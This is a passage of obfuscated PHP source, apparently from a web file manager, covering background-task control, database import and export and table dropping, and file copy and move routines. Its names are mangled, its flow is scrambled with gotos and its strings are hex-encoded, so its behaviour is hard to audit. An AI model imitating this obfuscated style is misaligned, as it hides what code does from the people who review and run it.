$e’ÄÕîê†×[$B²¼øÍİÎ[1512]]; } $e’ÄÕîê†×[$B²¼øÍİÎ[1516]] = $e’ÄÕîê†×[$B²¼øÍİÎ[1516]] <= 0 ? 0 : $e’ÄÕîê†×[$B²¼øÍİÎ[1516]]; } goto dÚÑ¶Ÿ„³…; E¶¼»Ì÷Æ: Hook::trigger($B²¼øÍİÎ[1528], $e’ÄÕîê†×); self::valueSet($e’ÄÕîê†×[$B²¼øÍİÎ[388]], $e’ÄÕîê†×); goto AÛ§Ë–¹ôÅ; d†ÁÕ¨äò»: $DëÆëò‘ÑÔ = self::get($e’ÄÕîê†×[$B²¼øÍİÎ[388]]); $c£é»ÃÄŒ“ = $DëÆëò‘ÑÔ[$B²¼øÍİÎ[711]]; if ($c£é»ÃÄŒ“ == self::STATYS_KILL) { $EğÍÄ·‰ = array($B²¼øÍİÎ[1525] => LNG($B²¼øÍİÎ[1526]), $B²¼øÍİÎ[1068] => !1); Cache::set($B²¼øÍİÎ[1527] . $this->task[$B²¼øÍİÎ[388]], $EğÍÄ·‰, 30); $this->end(); die; } else { if ($c£é»ÃÄŒ“ == self::STATYS_STOP) { $Fº‰·–Ïì = 2; $DëÆëò‘ÑÔ[$B²¼øÍİÎ[1515]] += $Fº‰·–Ïì; self::valueSet($e’ÄÕîê†×[$B²¼øÍİÎ[388]], $DëÆëò‘ÑÔ); sleep($Fº‰·–Ïì); $this->update(); return; } } goto F·¾’Î³„¥; AÛ§Ë–¹ôÅ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c²ÍÀ×Óñ) { $BÈˆ „„øÅ =& $_SERVER[ÉóçÄÇ]; Cache::set($BÈˆ „„øÅ[1527] . $this->task[$BÈˆ „„øÅ[388]], $c²ÍÀ×Óñ, 60); return $c²ÍÀ×Óñ; } public static function get($AµäÃÒ¯ğĞ) { return self::valueGet($AµäÃÒ¯ğĞ); } public static function listData() { $D‹œÍ—Ûß = self::valueGet(); return array_sort_by($D‹œÍ—Ûß, $_SERVER[ÉóçÄÇ][742], !0); } public static function kill($FÕ™ÁË£‚ï) { return self::changeStatus($FÕ™ÁË£‚ï, self::STATYS_KILL); } public static function stop($Eç¤ÄÙï»°) { return self::changeStatus($Eç¤ÄÙï»°, self::STATYS_STOP); } public static function restart($B×ÄÊ‚ ¼) { return self::changeStatus($B×ÄÊ‚ ¼, self::STATYS_RUNNING); } public static function killAll() { $b—šøËæéÈ =& $_SERVER[ÉóçÄÇ]; $D›µÛ”•˜Ö = self::listData(); foreach ($D›µÛ”•˜Ö as $aÆÉ·ùù¢‰) { self::kill($aÆÉ·ùù¢‰[$b—šøËæéÈ[388]]); } sleep(2); foreach ($D›µÛ”•˜Ö as $aÆÉ·ùù¢‰) { self::valueSet($aÆÉ·ùù¢‰[$b—šøËæéÈ[388]], !1); } } private static function changeStatus($f¬Ë´¬È, $aÓµ¶÷Êİ) { goto E÷¿¼ÏØ¥; d‹»¼¹÷£Ô: $e˜ÀÀŸ ‹¾[$eÚÕæò“Œ—[711]] = $aÓµ¶÷Êİ; self::valueSet($f¬Ë´¬È, $e˜ÀÀŸ ‹¾); self::log($eÚÕæò“Œ—[1529] . $e˜ÀÀŸ ‹¾[$eÚÕæò“Œ—[388]] . $eÚÕæò“Œ—[1530] . $aÓµ¶÷Êİ); goto d˜Øç†ˆ×Ğ; E÷¿¼ÏØ¥: $eÚÕæò“Œ— =& $_SERVER[ÉóçÄÇ]; $e˜ÀÀŸ ‹¾ = self::valueGet($f¬Ë´¬È); if (!$e˜ÀÀŸ ‹¾) { return !1; } goto d‹»¼¹÷£Ô; d˜Øç†ˆ×Ğ: return !0; goto FªÑ¬±ğçì; FªÑ¬±ğçì: } public static function valueGet($a¥Š¢¢ï·¢ = false) { $AÚö¿®ÕöÖ =& $_SERVER[ÉóçÄÇ]; if ($a¥Š¢¢ï·¢) { $eÛÙàÚÏ¶„ = Model($AÚö¿®ÕöÖ[419])->where(array($AÚö¿®ÕöÖ[92] => $a¥Š¢¢ï·¢, $AÚö¿®ÕöÖ[29] => $AÚö¿®ÕöÖ[1531]))->find(); return $eÛÙàÚÏ¶„ ? json_decode($eÛÙàÚÏ¶„[$AÚö¿®ÕöÖ[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($cïÌÂõ‘¶­ = false) { goto DÍ²é““¹š; A‚ô¥ìø¬ƒ: $e¶Ñ¡çØà† = Model($Aµå£Œ½[419])->where($eÉø¢İ©ìª)->select(); $e¶Ñ¡çØà† = $e¶Ñ¡çØà† ? $e¶Ñ¡çØà† : array(); foreach ($e¶Ñ¡çØà† as $fùĞ••ÕÖœ => $fÃøŞŸ‘ñ) { $e¶Ñ¡çØà†[$fùĞ••ÕÖœ] = json_decode($fÃøŞŸ‘ñ[$Aµå£Œ½[370]], !0); } goto BÔ¼¼©½; DÍ²é““¹š: $Aµå£Œ½ =& $_SERVER[ÉóçÄÇ]; $eÉø¢İ©ìª = array($Aµå£Œ½[29] => $Aµå£Œ½[1531]); if ($cïÌÂõ‘¶­) { $eÉø¢İ©ìª[$Aµå£Œ½[1511]] = $cïÌÂõ‘¶­; } goto A‚ô¥ìø¬ƒ; BÔ¼¼©½: return $e¶Ñ¡çØà†; goto cìŸŞºµ‹¨; cìŸŞºµ‹¨: } public static function valueSet($AÎ¿µ”Ìğ, $Eœê´»Œ½“) { goto Cá†øˆ‘à; CµæµíÙ¥«: Model($EƒŸöØî[419])->add($Cá”¨½™¦Ø, array(), !0); goto Cˆóù‘®·; Cá†øˆ‘à: $EƒŸöØî =& $_SERVER[ÉóçÄÇ]; if (!$Eœê´»Œ½“) { return Model($EƒŸöØî[419])->where(array($EƒŸöØî[92] => $AÎ¿µ”Ìğ, $EƒŸöØî[29] => $EƒŸöØî[1531]))->delete(); } $aÛÈÆÂ¾¢‡ = json_encode($Eœê´»Œ½“); goto F÷¨ïèäƒÚ; F÷¨ïèäƒÚ: if (!$aÛÈÆÂ¾¢‡) { ob_start(); var_dump($Eœê´»Œ½“); $F¢Óã¶ƒôÅ = ob_get_clean(); self::log($EƒŸöØî[1532] . json_encode_force($F¢Óã¶ƒôÅ)); } if (!$AÎ¿µ”Ìğ || !$Eœê´»Œ½“[$EƒŸöØî[388]]) { return !1; } $Cá”¨½™¦Ø = array($EƒŸöØî[29] => $EƒŸöØî[1531], $EƒŸöØî[1511] => USER_ID, $EƒŸöØî[92] => $AÎ¿µ”Ìğ, $EƒŸöØî[370] => $aÛÈÆÂ¾¢‡); goto CµæµíÙ¥«; Cˆóù‘®·: } public static function log($FÛƒëğ«£œ) { write_log($FÛƒëğ«£œ, $_SERVER[ÉóçÄÇ][1533]); } } goto EÇ‹ ìÒÌÂ; f†Ô¹áÓ©ï: class DbManage { function __construct($DØß¤“¡„, $d·Üœœ‰ Ê = '') { $this->database = $DØß¤“¡„; $this->type = $d·Üœœ‰ Ê; } public function model($aÇÁÒ„¡ÙÛ = '') { return new ModelBase($aÇÁÒ„¡ÙÛ, $_SERVER[ÉóçÄÇ][33], $this->database); } public function db($Fí©„¦¦˜ = false) { goto Bˆá¾¸ªöš; Bˆá¾¸ªöš: $EÇÑÀå»àŒ =& $_SERVER[ÉóçÄÇ]; $bÌÜ¯¸ö‡° = array_change_key_case($this->database); if ($this->type == $EÇÑÀå»àŒ[9] || !$Fí©„¦¦˜) { return $this->model()->db(); } goto fÄŸ‡åˆ©ê; BÌ„‹Ú±‡: if (!$FË‡ÜòïÙ) { $fôŒæŠÒòÅ->execute("\143\x72\145\x61\164\145\x20\x64\141\x74\141\x62\141\x73\145\x20\140{$DÄÛÖË–›õ}\x60"); } $bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[911]] = $DÄÛÖË–›õ; if ($bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[746]] == $EÇÑÀå»àŒ[747]) { $bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[748]] .= $EÇÑÀå»àŒ[1000] . $DÄÛÖË–›õ; } goto Bø¶‹©¶›á; fÄŸ‡åˆ©ê: $DÄÛÖË–›õ = $bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[911]]; $bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[911]] = $EÇÑÀå»àŒ[33]; if ($bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[746]] == $EÇÑÀå»àŒ[747]) { $c¬²¿‰ÎÎ÷ = $bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[748]]; $bÌÜ¯¸ö‡°[$EÇÑÀå»àŒ[748]] = substr($c¬²¿‰ÎÎ÷, 0, strrpos($c¬²¿‰ÎÎ÷, $EÇÑÀå»àŒ[1000])); } goto fŠàï´åĞÍ; Bø¶‹©¶›á: $this->database = $bÌÜ¯¸ö‡°; $fôŒæŠÒòÅ->execute("\x75\163\145\x20\140{$DÄÛÖË–›õ}\x60"); return $fôŒæŠÒòÅ; goto aÀÚ˜ùô½Ç; fŠàï´åĞÍ: $this->database = $bÌÜ¯¸ö‡°; $fôŒæŠÒòÅ = $this->model()->db(); try { $FË‡ÜòïÙ = $fôŒæŠÒòÅ->execute("\x73\150\157\x77\40\144\x61\164\141\142\141\x73\x65\x73\x20\154\151\x6b\x65\x20\47{$DÄÛÖË–›õ}\47"); } catch (Exception $DÈñ¤àŒ») { } goto BÌ„‹Ú±‡; aÀÚ˜ùô½Ç: } public function createTable($Aé•î‘°ã, $Dè¡’¹†ëƒ = null) { $CŒ–‚ßÔÀ° =& $_SERVER[ÉóçÄÇ]; if (!IO::exist($Aé•î‘°ã)) { ActionCall($CŒ–‚ßÔÀ°[1001], !0, 0); show_json(LNG($CŒ–‚ßÔÀ°[1002]), !1); } $FÏä…÷´ŠÃ = sqlSplit(IO::getContent($Aé•î‘°ã)); foreach ($FÏä…÷´ŠÃ as $Cçí¢’İØ) { if ($Dè¡’¹†ëƒ) { $aÆëÛò¿†¶ = stripos($Cçí¢’İØ, $CŒ–‚ßÔÀ°[1003]) === 0; if ($aÆëÛò¿†¶) { $Dè¡’¹†ëƒ->task[$CŒ–‚ßÔÀ°[1004]] += 1; } } $this->model()->db()->execute($Cçí¢’İØ); if ($Dè¡’¹†ëƒ && $aÆëÛò¿†¶) { preg_match($CŒ–‚ßÔÀ°[1005], $Cçí¢’İØ, $fßñôñ±µ¨); $Dè¡’¹†ëƒ->task[$CŒ–‚ßÔÀ°[1006]] = $fßñôñ±µ¨[1]; $Dè¡’¹†ëƒ->update(1); } } $this->taskToCache($Dè¡’¹†ëƒ); } public function insertTable($fÔ¹ù¨äÊË, $fŠ×”âÙ¾ = null) { $dîî¹‰Œ =& $_SERVER[ÉóçÄÇ]; $fç¬”‚Øç = $this->model()->db(); $dÌĞ˜Íóò = $E”å¸Ö±Ï« ? array($E”å¸Ö±Ï«) : $fç¬”‚Øç->getTables(); foreach ($fÔ¹ù¨äÊË as $FŞÆ÷¢ãİ) { $E”å¸Ö±Ï« = basename($FŞÆ÷¢ãİ, $dîî¹‰Œ[739]); if (!in_array($E”å¸Ö±Ï«, $dÌĞ˜Íóò)) { continue; } if ($fŠ×”âÙ¾) { $fŠ×”âÙ¾->task[$dîî¹‰Œ[1006]] = $E”å¸Ö±Ï«; } if (get_filesize($FŞÆ÷¢ãİ) == 0) { continue; } $aÈá†´¨Ş = $this->sqlToDb($FŞÆ÷¢ãİ, $fŠ×”âÙ¾); if (!$aÈá†´¨Ş) { ActionCall($dîî¹‰Œ[1001], !0, 0); show_json(LNG($dîî¹‰Œ[1007]) . "\x5b{$E”å¸Ö±Ï«}\135", !1); } } $this->taskToCache($fŠ×”âÙ¾); } public function sqlFromDb($BÆÕïÍÊšğ, $fÜÈ¼¶ŸÙÁ, $CÎ«Õ²Ë” = null, $AßÒ®µô«É = null) { goto bË‰ßÕªî‚; bË‰ßÕªî‚: if ($CÎ«Õ²Ë”) { $CÎ«Õ²Ë”->task[$_SERVER[ÉóçÄÇ][1006]] = $BÆÕïÍÊšğ; } $E’Ş­°çç = $this->model($BÆÕïÍÊšğ); $BØƒˆÄÊœ = 0; goto BÌİ¨‚É¼ö; BÚÅ±³©İÕ: fclose($cÈæ®ï†‚ê); return $BØƒˆÄÊœ; goto eÃÃÚİ®õ§; A­Ğ ¼¶ß“: $aÑÙ»Ì‰Ğ = $E’Ş­°çç->getPk(); $fä’â‡‰Ñë = $E’Ş­°çç->getDbFields(); do { $e×¹à©²‘º = $E’Ş­°çç->field($fä’â‡‰Ñë)->order($aÑÙ»Ì‰Ğ . $_SERVER[ÉóçÄÇ][1009])->selectPage($b†š˜ìê, $D×ìİíÈ†¢); $E‡›¦±¥åİ = isset($e×¹à©²‘º[$_SERVER[ÉóçÄÇ][362]][$_SERVER[ÉóçÄÇ][364]]) ? $e×¹à©²‘º[$_SERVER[ÉóçÄÇ][362]][$_SERVER[ÉóçÄÇ][364]] : 0; $F¯œç”ñÖ© = !empty($e×¹à©²‘º[$_SERVER[ÉóçÄÇ][365]]) ? $e×¹à©²‘º[$_SERVER[ÉóçÄÇ][365]] : array(); if (!($eé—Ù¹Ãéƒ = count($F¯œç”ñÖ©))) { break; } $Eêµè®–• = array(); foreach ($F¯œç”ñÖ© as $b§ˆÜßÈÄ·) { if ($BÆÕïÍÊšğ == $_SERVER[ÉóçÄÇ][1010] && $b§ˆÜßÈÄ·[$_SERVER[ÉóçÄÇ][29]] == $_SERVER[ÉóçÄÇ][1011]) { $FŞ™©åæ¿ = json_decode($b§ˆÜßÈÄ·[$_SERVER[ÉóçÄÇ][370]], !0); if ($FŞ™©åæ¿[$_SERVER[ÉóçÄÇ][28]] == date($_SERVER[ÉóçÄÇ][712]) && !$FŞ™©åæ¿[$_SERVER[ÉóçÄÇ][711]]) { continue; } } if ($AßÒ®µô«É) { $b§ˆÜßÈÄ·[$_SERVER[ÉóçÄÇ][75]] = "\x7b\151\157\72{$AßÒ®µô«É}\x7d" . substr($b§ˆÜßÈÄ·[$_SERVER[ÉóçÄÇ][75]], strlen("\173\151\157\72{$b§ˆÜßÈÄ·[$_SERVER[ÉóçÄÇ][769]]}\175")); $b§ˆÜßÈÄ·[$_SERVER[ÉóçÄÇ][769]] = $AßÒ®µô«É; } $Eêµè®–•[] = $_SERVER[ÉóçÄÇ][1012] . $this->sqlEncode($b§ˆÜßÈÄ·) . $_SERVER[ÉóçÄÇ][1013]; } $bÙ‹„§šàØ = "\111\116\x53\x45\x52\x54\x20\111\x4e\x54\117\x20\x60{$BÆÕïÍÊšğ}\x60\40\x28\140" . implode($_SERVER[ÉóçÄÇ][1014], $fä’â‡‰Ñë) . $_SERVER[ÉóçÄÇ][1015]; fwrite($cÈæ®ï†‚ê, $bÙ‹„§šàØ . implode($_SERVER[ÉóçÄÇ][1016], $Eêµè®–•) . $_SERVER[ÉóçÄÇ][67] . PHP_EOL); $D×ìİíÈ†¢++; $BØƒˆÄÊœ += $eé—Ù¹Ãéƒ; if ($CÎ«Õ²Ë”) { $CÎ«Õ²Ë”->update($eé—Ù¹Ãéƒ); } } while ($D×ìİíÈ†¢ <= $E‡›¦±¥åİ); goto BÚÅ±³©İÕ; BÌİ¨‚É¼ö: $D×ìİíÈ†¢ = 1; $b†š˜ìê = 500; $cÈæ®ï†‚ê = fopen($fÜÈ¼¶ŸÙÁ, $_SERVER[ÉóçÄÇ][1008]); goto A­Ğ ¼¶ß“; eÃÃÚİ®õ§: } public function sqlToDb($Eß£åƒ¯, $aÏÄí‡Ô²À = null) { goto bØåóõï‹ì; fÈ”‹‹Ş¡Ë: if (trim($B›Šƒ–Ş©„)) { $B›Šƒ–Ş©„ = rtrim(trim($B›Šƒ–Ş©„), $B´ùÍÛé°[67]); if (!$E¬¯ø®àõ‘->execute($B›Šƒ–Ş©„)) { return !1; } if ($aÏÄí‡Ô²À) { $aÏÄí‡Ô²À->update($d†­İ¢™ ­ - 1); } } return !0; goto BâÒ­ˆ•º½; Dß•ªàá: $AÇ‹å¬ñ› = 500 + 1; while (!feof($e‰¼¿£‹ã)) { if ($aÏÄí‡Ô²À && $d†­İ¢™ ­ != 0) { $aÏÄí‡Ô²À->task[$B´ùÍÛé°[1004]] += 1; } $d†­İ¢™ ­++; $aÙ×¡ˆâŞˆ = trim(fgets($e‰¼¿£‹ã)); $B›Šƒ–Ş©„ .= $B´ùÍÛé°[50] . $this->sqlDecode($aÙ×¡ˆâŞˆ, $this->type); if ($d†­İ¢™ ­ == $AÇ‹å¬ñ›) { $B›Šƒ–Ş©„ = rtrim(trim($B›Šƒ–Ş©„), $B´ùÍÛé°[67]); if (!$E¬¯ø®àõ‘->execute($B›Šƒ–Ş©„)) { return !1; } if ($aÏÄí‡Ô²À) { $aÏÄí‡Ô²À->update($d†­İ¢™ ­ - 1); } $B›Šƒ–Ş©„ = $B´ùÍÛé°[33]; $d†­İ¢™ ­ = 0; } } fclose($e‰¼¿£‹ã); goto fÈ”‹‹Ş¡Ë; d˜‚í„Ôˆ: if (!$e‰¼¿£‹ã) { return !1; } $d†­İ¢™ ­ = 0; $B›Šƒ–Ş©„ = $B´ùÍÛé°[33]; goto Dß•ªàá; bØåóõï‹ì: $B´ùÍÛé° =& $_SERVER[ÉóçÄÇ]; $E¬¯ø®àõ‘ = $this->model()->db(); $e‰¼¿£‹ã = @fopen($Eß£åƒ¯, $B´ùÍÛé°[1017]); goto d˜‚í„Ôˆ; BâÒ­ˆ•º½: } public function dropTable($aÀù›¥Œ = null) { $fÎÉø›ƒÆ¬ = $this->model()->db(); $f“””»‡½ì = $aÀù›¥Œ ? array($aÀù›¥Œ) : $fÎÉø›ƒÆ¬->getTables(); if (!$f“””»‡½ì) { return; } foreach ($f“””»‡½ì as $aÀù›¥Œ) { $fÎÉø›ƒÆ¬->execute("\x64\x72\x6f\x70\40\x74\141\x62\x6c\145\x20\151\146\x20\145\170\x69\x73\x74\x73\40\140{$aÀù›¥Œ}\140"); } } private function taskToCache($f°˜¦ßˆÕë = null) { $cÎ„ù¤šÁ =& $_SERVER[ÉóçÄÇ]; if (!$f°˜¦ßˆÕë) { return; } $EØ±‹çˆÕ = array($cÎ„ù¤šÁ[1006] => $f°˜¦ßˆÕë->task[$cÎ„ù¤šÁ[1006]], $cÎ„ù¤šÁ[1004] => $f°˜¦ßˆÕë->task[$cÎ„ù¤šÁ[1004]], $cÎ„ù¤šÁ[1018] => $f°˜¦ßˆÕë->task[$cÎ„ù¤šÁ[1018]]); if ($EØ±‹çˆÕ[$cÎ„ù¤šÁ[1004]] == $EØ±‹çˆÕ[$cÎ„ù¤šÁ[1018]]) { $EØ±‹çˆÕ[$cÎ„ù¤šÁ[718]] = 1; } Cache::set($cÎ„ù¤šÁ[1019] . $f°˜¦ßˆÕë->task[$cÎ„ù¤šÁ[388]], $EØ±‹çˆÕ); $f°˜¦ßˆÕë->end(); } private function sqlEncode($fÚÍ‘ïÍŸÎ) { $b¤ÁÜ‘ô«’ =& $_SERVER[ÉóçÄÇ]; $a‘î…Âïç± = array(); foreach ($fÚÍ‘ïÍŸÎ as $eÂ¬Èóòë) { if (is_array($eÂ¬Èóòë)) { $eÂ¬Èóòë = json_encode_force($eÂ¬Èóòë); } $eÂ¬Èóòë = addslashes($eÂ¬Èóòë); $eÂ¬Èóòë = str_replace(array($b¤ÁÜ‘ô«’[1020], $b¤ÁÜ‘ô«’[227]), array($b¤ÁÜ‘ô«’[1021], $b¤ÁÜ‘ô«’[1022]), $eÂ¬Èóòë); $a‘î…Âïç±[] = str_replace($b¤ÁÜ‘ô«’[55], $b¤ÁÜ‘ô«’[1023], $eÂ¬Èóòë); } return $b¤ÁÜ‘ô«’[55] . implode($b¤ÁÜ‘ô«’[1024], $a‘î…Âïç±) . $b¤ÁÜ‘ô«’[55]; } private function sqlDecode($aĞ‹Ôà³‡¦, $A¼œ›†ë¤) { $bƒöÕªİ‰Í =& $_SERVER[ÉóçÄÇ]; $aĞ‹Ôà³‡¦ = str_replace(array($bƒöÕªİ‰Í[1021], $bƒöÕªİ‰Í[1022]), array($bƒöÕªİ‰Í[1020], $bƒöÕªİ‰Í[227]), $aĞ‹Ôà³‡¦); if ($A¼œ›†ë¤ == $bƒöÕªİ‰Í[9]) { $aĞ‹Ôà³‡¦ = stripslashes($aĞ‹Ôà³‡¦); } return $aĞ‹Ôà³‡¦; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($e‹„Ö¯ƒÉê, $d›¶«¿ÖÒ) { goto FåâÃÜáºÖ; a—ù¥Â‚: Hook::trigger($dÆš±¾¢¦[1026] . $e‹„Ö¯ƒÉê . $dÆš±¾¢¦[1029], $DÎ¶—Õùëƒ, $Eç÷¢ê¹ÊÇ); return $Eç÷¢ê¹ÊÇ; goto b„¶ò¸¬¼ƒ; AŒãò„¯œ±: Hook::trigger($dÆš±¾¢¦[1026] . $e‹„Ö¯ƒÉê . $dÆš±¾¢¦[1027], $DÎ¶—Õùëƒ); $B…­¶× ¶¨ = self::driverMake($d›¶«¿ÖÒ[0]); if (method_exists($B…­¶× ¶¨, $e‹„Ö¯ƒÉê)) { $Eç÷¢ê¹ÊÇ = @call_user_func_array(array($B…­¶× ¶¨, $e‹„Ö¯ƒÉê), $d›¶«¿ÖÒ); } else { if (method_exists($B…­¶× ¶¨, $dÆš±¾¢¦[1028])) { $Eç÷¢ê¹ÊÇ = @call_user_func_array(array($B…­¶× ¶¨, $e‹„Ö¯ƒÉê), $d›¶«¿ÖÒ); } else { if (method_exists(self, $e‹„Ö¯ƒÉê)) { $Eç÷¢ê¹ÊÇ = @call_user_func_array(array(self, $e‹„Ö¯ƒÉê), $d›¶«¿ÖÒ); } else { $Eç÷¢ê¹ÊÇ = call_user_func_array(array(parent, $e‹„Ö¯ƒÉê), $d›¶«¿ÖÒ); } } } goto a—ù¥Â‚; FåâÃÜáºÖ: $dÆš±¾¢¦ =& $_SERVER[ÉóçÄÇ]; $DÎ¶—Õùëƒ = $d›¶«¿ÖÒ; $GLOBALS[$dÆš±¾¢¦[1025]] = $dÆš±¾¢¦[1026] . $e‹„Ö¯ƒÉê; goto AŒãò„¯œ±; b„¶ò¸¬¼ƒ: } public static function init($E˜ÈÕô÷ŞŸ) { return self::driverMake($E˜ÈÕô÷ŞŸ); } public static function copy($bÄÃ ùÒ®, $eÎ•Šóï¯, $a¸–—ì½°¾ = false, $B±ööÇ¿…® = false) { return self::copyMoveStart($bÄÃ ùÒ®, $eÎ•Šóï¯, $a¸–—ì½°¾, $_SERVER[ÉóçÄÇ][513], $B±ööÇ¿…®); } public static function move($FŞÓèéğÏÔ, $eœà‰°‰›®, $c„÷Çµñœ = false, $E«´ß§ÊÜÔ = false) { return self::copyMoveStart($FŞÓèéğÏÔ, $eœà‰°‰›®, $c„÷Çµñœ, $_SERVER[ÉóçÄÇ][515], $E«´ß§ÊÜÔ); } private static function copyMoveStart($b–˜—¬‰Ş, $e«¶ß°’ˆ, $AÖõˆåÕÂ, $b‡¢ôªÕ×½, $fŒöêÊ™ÆÁ) { $F§ë”ÑÆ¤ =& $_SERVER[ÉóçÄÇ]; $a×‡ë®«¼¯ = array($b–˜—¬‰Ş, $e«¶ß°’ˆ, $AÖõˆåÕÂ, $fŒöêÊ™ÆÁ); Hook::trigger($F§ë”ÑÆ¤[1026] . $b‡¢ôªÕ×½ . $F§ë”ÑÆ¤[1027], $a×‡ë®«¼¯); $dŠê¹Ğİ‘ = self::copyMove($b–˜—¬‰Ş, $e«¶ß°’ˆ, $AÖõˆåÕÂ, $b‡¢ôªÕ×½, $fŒöêÊ™ÆÁ); Hook::trigger($F§ë”ÑÆ¤[1026] . $b‡¢ôªÕ×½ . $F§ë”ÑÆ¤[1029], $a×‡ë®«¼¯, $dŠê¹Ğİ‘); return $dŠê¹Ğİ‘; } public static function saveFile($AÏ‚øØÊÏ, $BíŞé»Ğ¢¾, $FÓ½¹Ÿ«‹İ = true) { goto fôÌ÷¡Íåé; EË¤¬Î“¼º: $BÌ¡‘ˆóæß = self::copyFile($béƒ³È•›ã, $AÏ‚øØÊÏ, $cÄµ„Î·¹, $F»¶Ê»‚¼¨, $FõÕŒ¯à[$F‚Š„¦«„±[28]], $EÆ°• …Ô); if ($f³îŸÙë“) { $BÌ¡‘ˆóæß = $f³îŸÙë“->getPathOuter($BÌ¡‘ˆóæß); } return $BÌ¡‘ˆóæß; goto BéÑã¦îŒï; fƒ‚©¶¦¿: $F»¶Ê»‚¼¨ = $cÄµ„Î·¹->pathFather($BíŞé»Ğ¢¾); $EÆ°• …Ô = !0; if (!$FÓ½¹Ÿ«‹İ && self::driverIsSame($béƒ³È•›ã, $cÄµ„Î·¹)) { $EÆ°• …Ô = !1; } goto EË¤¬Î“¼º; fôÌ÷¡Íåé: $F‚Š„¦«„± =& $_SERVER[ÉóçÄÇ]; $FõÕŒ¯à = self::info($BíŞé»Ğ¢¾); $béƒ³È•›ã = self::driverMake($AÏ‚øØÊÏ); goto d¨¯Í—”ö™; d¨¯Í—”ö™: $cÄµ„Î·¹ = self::driverMake($BíŞé»Ğ¢¾); $f³îŸÙë“ = !1; if ($cÄµ„Î·¹->pathParse[$F‚Š„¦«„±[1030]]) { $Aá‘•´š‹Ş = $cÄµ„Î·¹->pathParse[$F‚Š„¦«„±[1030]]; $f³îŸÙë“ = $cÄµ„Î·¹; $cÄµ„Î·¹ = self::driverMake($Aá‘•´š‹Ş); } goto fƒ‚©¶¦¿; BéÑã¦îŒï: } private static function copyMove($f‘Àá‰ª ¹, $Aä÷—Ó‹ã , $aå¼Ö†²Ê¾, $dóŞÓÆ³ÇÙ, $d„›ƒ‡ÙÉ© = false) { goto A‰…ãß´À; fß½ì°ç¨Ø: if ($E®¯øñ÷) { $Fòğ„§Ÿ¢ = $E®¯øñ÷->getPathOuter($Fòğ„§Ÿ¢); } return $Fòğ„§Ÿ¢; goto E††ï¢Ï½; DÙÁîĞ‘Ì‡: Hook::trigger($cÜ…ªÀ¾¯Š[72], $CŞÊêÔÛ–ˆ, $f‘Àá‰ª ¹, $c”¦¡³¯çä, $Aä÷—Ó‹ã ); $AÆÖïïËà“ = self::driverIsSame($CŞÊêÔÛ–ˆ, $c”¦¡³¯çä); if ($AÆÖïïËà“) { if ($dóŞÓÆ³ÇÙ == $cÜ…ªÀ¾¯Š[515] && !method_exists($c”¦¡³¯çä, $cÜ…ªÀ¾¯Š[1031]) && trim($Aä÷—Ó‹ã , $cÜ…ªÀ¾¯Š[8]) == trim($c”¦¡³¯çä->pathFather($f‘Àá‰ª ¹), $cÜ…ªÀ¾¯Š[8])) { if ($CŞÊêÔÛ–ˆ->pathThis($f‘Àá‰ª ¹) != $d„›ƒ‡ÙÉ© && !$CŞÊêÔÛ–ˆ->isTypeObject()) { return $CŞÊêÔÛ–ˆ->rename($f‘Àá‰ª ¹, $d„›ƒ‡ÙÉ©); } return $c”¦¡³¯çä->getPathOuter($f‘Àá‰ª ¹); } if (method_exists($c”¦¡³¯çä, $dóŞÓÆ³ÇÙ)) { return $c”¦¡³¯çä->{$dóŞÓÆ³ÇÙ}($f‘Àá‰ª ¹, $Aä÷—Ó‹ã , $aå¼Ö†²Ê¾); } } goto eĞôä£ËÒö; cšÉÏ½±ßñ: $CŞÊêÔÛ–ˆ = self::driverMake($f‘Àá‰ª ¹); $c”¦¡³¯çä = self::driverMake($Aä÷—Ó‹ã ); $fÊ®ª©¿«“ = $dóŞÓÆ³ÇÙ == $cÜ…ªÀ¾¯Š[515]; goto A³§Úæ÷ÇÈ; eĞôä£ËÒö: $a„ÀõÖ‹» = $CŞÊêÔÛ–ˆ->isFile($f‘Àá‰ª ¹); if (!$a„ÀõÖ‹» && $c”¦¡³¯çä->getType() == $cÜ…ªÀ¾¯Š[716] && $CŞÊêÔÛ–ˆ->getType() == $cÜ…ªÀ¾¯Š[105]) { $Fòğ„§Ÿ¢ = $c”¦¡³¯çä->copyFolderFromIO($CŞÊêÔÛ–ˆ, $f‘Àá‰ª ¹, $Aä÷—Ó‹ã , $aå¼Ö†²Ê¾, $fÊ®ª©¿«“, $d„›ƒ‡ÙÉ©); } else { $Fòğ„§Ÿ¢ = self::copyPath($CŞÊêÔÛ–ˆ, $f‘Àá‰ª ¹, $c”¦¡³¯çä, $Aä÷—Ó‹ã , $aå¼Ö†²Ê¾, $fÊ®ª©¿«“, $a„ÀõÖ‹», $d„›ƒ‡ÙÉ©); } if ($Fòğ„§Ÿ¢ && $fÊ®ª©¿«“) { $CŞÊêÔÛ–ˆ->remove($f‘Àá‰ª ¹); } goto fß½ì°ç¨Ø; A‰…ãß´À: $cÜ…ªÀ¾¯Š =& $_SERVER[ÉóçÄÇ]; if (!$f‘Àá‰ª ¹ || $f‘Àá‰ª ¹ == $cÜ…ªÀ¾¯Š[8] || !$Aä÷—Ó‹ã ) { return !1; } ignore_timeout(); goto cšÉÏ½±ßñ; A³§Úæ÷ÇÈ: $E®¯øñ÷ = !1; if ($c”¦¡³¯çä->pathParse[$cÜ…ªÀ¾¯Š[1030]]) { $Aä÷—Ó‹ã  = $c”¦¡³¯çä->pathParse[$cÜ…ªÀ¾¯Š[1030]]; $E®¯øñ÷ = $c”¦¡³¯çä; $c”¦¡³¯çä = self::driverMake($Aä÷—Ó‹ã ); } self::check($CŞÊêÔÛ–ˆ, $f‘Àá‰ª ¹, $c”¦¡³¯çä, $Aä÷—Ó‹ã ); goto DÙÁîĞ‘Ì‡; E††ï¢Ï½: } private static function check($Eîç¼šÏ«Ã, $eÜ¤Ğ·’ƒ´, $C×¼…ÀœÕ, &$F¦ÊêÀß¼¦) { $aõ‡Öò÷¥ =& $_SERVER[ÉóçÄÇ]; if (self::driverIsSame($Eîç¼šÏ«Ã, 